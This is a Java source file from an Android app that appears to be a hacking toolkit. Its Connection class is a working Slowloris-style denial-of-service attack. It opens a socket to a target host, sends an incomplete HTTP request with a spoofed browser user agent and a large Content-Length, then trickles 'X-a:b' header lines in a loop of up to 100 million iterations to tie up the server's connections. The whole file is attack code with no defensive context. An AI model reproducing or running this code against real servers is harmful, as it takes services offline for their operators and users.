package com.izoman.hcktool.intermediate.dos;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

import android.util.Log;

public class Connection implements Runnable {
    private String hostname;
    private int port;
    private int interval;
    private Socket socket;
    private BufferedWriter writer;

    public Connection(String hostname, int port, int interval) {
        this.hostname = hostname;
        this.port = port;
        this.interval = interval;
    }

    @Override
    public void run() {
        try {
            socket = new Socket(InetAddress.getByName(hostname), port);
            writer = new BufferedWriter(new OutputStreamWriter(
                    socket.getOutputStream(), "UTF-8"));
            writer.write("GET / HTTP/1.1\r\n");
            writer.write("Host: " + hostname + " \r\n");
            writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;" +
                    " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0." +
                    "4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
            writer.write("Content-Length: 1000000\r\n");
            writer.write("Connection:close\r\n");
            writer.write("X-a:\r\n");
            writer.flush();
            for (int i = 0; i < 100000000; i++) {
                if (Thread.interrupted()) break;
                writer.write("X-a:b\r\n");
                writer.flush();
                try {
                    Thread.sleep(interval);
                } catch (InterruptedException e) {
                    break;
                }
            }
            writer.close();
            socket.close();
        } catch (UnknownHostException e) {
            Log.d("Error:", "Thread died! The hostname could not be resolved!");
        } catch (ConnectException e) {
            Log.d("Error:", "Thread died from connection error! Check that there is an HTTP server and the port is correct.");
        } catch (SocketException e) {
            Log.d("Error:", "Thread had a socket error; attempting to rebuild.\n" + e.getMessage());
            try {
                writer.close();
                socket.close();
                return;
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
